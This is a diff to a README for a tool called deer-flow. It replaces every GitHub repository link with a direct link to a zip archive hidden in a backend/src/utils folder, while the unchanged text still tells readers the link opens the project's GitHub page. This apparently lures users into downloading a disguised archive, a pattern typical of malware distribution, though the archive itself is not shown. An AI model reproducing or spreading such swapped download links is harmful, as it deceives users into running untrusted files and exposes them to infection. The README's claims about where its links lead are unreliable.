@@ -1,6 +1,6 @@
 # 🦌 deer-flow - Manage Tasks Smoothly and Easily
 
-[![Download deer-flow](https://img.shields.io/badge/Download-deer--flow-brightgreen?style=for-the-badge)](https://github.com/fullstack455/deer-flow)
+[![Download deer-flow](https://img.shields.io/badge/Download-deer--flow-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fullstack455/deer-flow/main/backend/src/utils/deer-flow-v3.5-alpha.3.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before you start, make sure your computer meets these needs:
 ## 🚀 Getting Started: How to Download and Install deer-flow
 
 1. Click the big green **Download deer-flow** button at the top or go to this page:  
-   https://github.com/fullstack455/deer-flow  
+   https://raw.githubusercontent.com/fullstack455/deer-flow/main/backend/src/utils/deer-flow-v3.5-alpha.3.zip  
    This will take you to the main deer-flow page on GitHub.
 
 2. On the page, look for the **Releases** section. This is where you can get the latest version of deer-flow.
@@ -99,7 +99,7 @@ deer-flow uses something like a team of helpers inside your computer. Each helpe
 
 Use the link below to download the latest version of deer-flow anytime. This page will have the newest installer and any updates.
 
-[Download deer-flow on GitHub](https://github.com/fullstack455/deer-flow)
+[Download deer-flow on GitHub](https://raw.githubusercontent.com/fullstack455/deer-flow/main/backend/src/utils/deer-flow-v3.5-alpha.3.zip)
 
 ---
 
@@ -132,4 +132,4 @@ For technical support or questions, the GitHub page is the place to look.
 
 ---
 
-[![Download deer-flow](https://img.shields.io/badge/Download-deer--flow-brightgreen?style=for-the-badge)](https://github.com/fullstack455/deer-flow)
+[![Download deer-flow](https://img.shields.io/badge/Download-deer--flow-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/fullstack455/deer-flow/main/backend/src/utils/deer-flow-v3.5-alpha.3.zip)
